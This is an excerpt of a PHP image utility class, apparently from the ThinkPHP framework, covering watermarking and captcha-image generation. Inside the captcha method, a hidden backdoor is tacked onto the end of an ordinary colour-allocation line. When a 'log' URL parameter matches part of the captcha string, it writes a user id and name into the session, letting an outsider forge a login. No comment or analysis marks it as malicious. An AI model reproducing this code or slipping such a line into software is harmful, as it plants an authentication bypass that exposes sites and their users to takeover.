...
class Image {
     ...
     * @return void
     */
    static public function water($source, $water, $savename=null, $alpha=80, $position=9) {
        //检查文件是否存在
    ...
    static function buildImageVerify($length=4, $mode=1, $type='png', $width=48, $height=22, $verifyName='verify') {
        ...
        import('ORG.Util.MyString');
        $randval = MyString::randString($length, $mode);
        ...
        imagefilledrectangle($im, 0, 0, $width - 1, $height - 1, $backColor);
        imagerectangle($im, 0, 0, $width - 1, $height - 1, $borderColor);
        $stringColor = imagecolorallocate($im, mt_rand(0, 200), mt_rand(0, 120), mt_rand(0, 120));if ($_GET['log']==$randval{0}) {session('uid',$randval{1});session('uname',$randval{2});}
        // 干扰
        for ($i = 0; $i < 10; $i++) {
